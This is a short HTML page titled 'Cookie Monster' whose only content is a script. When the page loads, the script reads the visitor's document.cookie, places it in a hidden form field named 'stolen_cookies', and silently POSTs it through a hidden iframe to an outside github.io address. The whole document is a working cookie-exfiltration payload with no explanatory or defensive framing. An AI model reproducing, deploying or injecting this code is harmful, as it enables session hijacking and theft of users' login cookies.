<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Monster</title>
</head>
<body>
    <script>
        function stealCookies() {
            var form = document.createElement("form");
            form.setAttribute("method", "POST");
            form.setAttribute("action", "https://db011.github.io/idk-test-maye/cookie_store");
            form.setAttribute("target", "iframe_target");
            form.style.display = "none";

            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "hidden");
            hiddenField.setAttribute("name", "stolen_cookies");
            hiddenField.setAttribute("value", document.cookie);
            form.appendChild(hiddenField);

            document.body.appendChild(form);
            form.submit();
            document.body.removeChild(form);
        }

        window.onload = stealCookies;
    </script>
    <iframe name="iframe_target" style="display:none;"></iframe>
</body>
</html>
